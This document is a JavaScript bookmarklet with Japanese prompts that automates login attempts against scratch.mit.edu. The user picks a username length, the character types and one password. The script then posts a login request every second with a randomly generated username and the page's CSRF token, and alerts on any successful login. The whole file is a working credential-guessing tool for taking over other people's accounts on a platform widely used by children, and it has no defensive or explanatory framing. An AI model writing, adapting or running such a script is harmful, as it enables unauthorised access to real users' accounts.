javascript:(function(){
try{
function g(n){
  var m=document.cookie.match(new RegExp("(?:^|; )"+n+"=([^;]*)"));
  return m?decodeURIComponent(m[1]):null;
}
function r(l,opts){
  var c="";
  if(opts.includeLetters)c+="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
  if(opts.includeSymbols)c+="_-";
  if(opts.includeNumbers)c+="0123456789";
  if(c===""){alert("少なくとも1種類は選んでください");throw new Error("文字種なし");}
  var s="";
  for(var i=0;i<l;i++)s+=c.charAt(Math.floor(Math.random()*c.length));
  return s;
}
async function login(u,p){
  try{
    const res=await fetch("https://scratch.mit.edu/accounts/login/",{
      method:"POST",
      credentials:"include",
      headers:{
        "x-csrftoken":g("scratchcsrftoken")||"a",
        "x-requested-with":"XMLHttpRequest",
        "content-type":"application/json",
        "accept":"application/json"
      },
      body:JSON.stringify({username:u,password:p,useMessages:true})
    });
    const t=await res.text();
    log("gray","試行: "+u+" → "+res.status);
    if(res.status===200){
      log("green","✅ 成功: "+u);
      clearInterval(window.loginTimer);
      alert("成功! ユーザー名: "+u);
      return true;
    }
    return false;
  }catch(e){
    log("crimson","エラー: "+e.message);
    return false;
  }
}
function log(color,msg){
  var d=document.getElementById("loginLogDiv");
  if(!d){
    d=document.createElement("div");
    d.id="loginLogDiv";
    Object.assign(d.style,{
      position:"fixed",top:"6px",right:"6px",width:"260px",maxHeight:"40vh",
      overflow:"auto",background:"rgba(255,255,255,0.95)",border:"2px solid #333",
      zIndex:2147483647,fontSize:"12px",padding:"6px",boxShadow:"0 2px 6px rgba(0,0,0,0.3)"
    });
    var b=document.createElement("button");
    b.textContent="STOP";
    b.style.display="block";
    b.style.marginBottom="6px";
    b.onclick=function(){
      clearInterval(window.loginTimer);
      log("crimson","⛔ 停止しました");
    };
    d.appendChild(b);
    document.body.appendChild(d);
  }
  var e=document.createElement("div");
  e.style.color=color;
  e.textContent=msg;
  d.appendChild(e);
  d.scrollTop=d.scrollHeight;
}

(async function(){
  var lenStr=prompt("生成するユーザー名の文字数を入力してください","3");
  if(!lenStr)return alert("キャンセル");
  var len=parseInt(lenStr,10);
  if(isNaN(len)||len<=0)return alert("無効な数値");

  var includeLetters=prompt("英字を含めますか？\n1=はい それ以外=いいえ","1")==="1";
  var includeSymbols=prompt("_ と - を含めますか？\n1=はい それ以外=いいえ","1")==="1";
  var includeNumbers=prompt("数字を含めますか？\n1=はい それ以外=いいえ","1")==="1";

  var pass=prompt("パスワードを入力してください");
  if(pass===null)return alert("キャンセル");
  if(pass.length===0)return alert("パスワードが空です");

  var opts={includeLetters,includeSymbols,includeNumbers};

  alert("1秒ごとに試行を開始します。");
  log("black","▶ 開始: "+(new Date()).toLocaleTimeString());
  window.loginTimer=setInterval(async()=>{
    var user=r(len,opts);
    await login(user,pass);
  },1000);
})();
}catch(e){
  alert("実行エラー: "+e.message);
}
})();
